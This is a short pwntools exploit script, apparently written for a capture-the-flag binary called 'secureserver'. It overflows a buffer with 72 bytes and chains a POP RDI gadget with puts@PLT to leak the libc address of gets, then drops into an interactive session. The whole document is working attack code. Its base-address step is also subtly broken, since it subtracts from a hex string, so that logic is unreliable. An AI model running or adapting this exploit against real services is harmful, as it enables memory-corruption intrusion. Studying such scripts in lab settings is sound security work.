from pwn import *

elf = context.binary = ELF('./secureserver')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("n/A", 10305)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b receive_feedback
    c
    ''')
else:
    conn = elf.process()

conn.recvuntil(b":")
conn.sendline(b"a"*72 + flat([
    0x40120b, # POP RDI
    elf.got["gets"],
    elf.plt["puts"]
]))
conn.recvline()
conn.recvline()
c = hex(u64(conn.recv().ljust(8, b"\x00")))

base = c - elf.libc

print(base)

print(c)
conn.interactive()  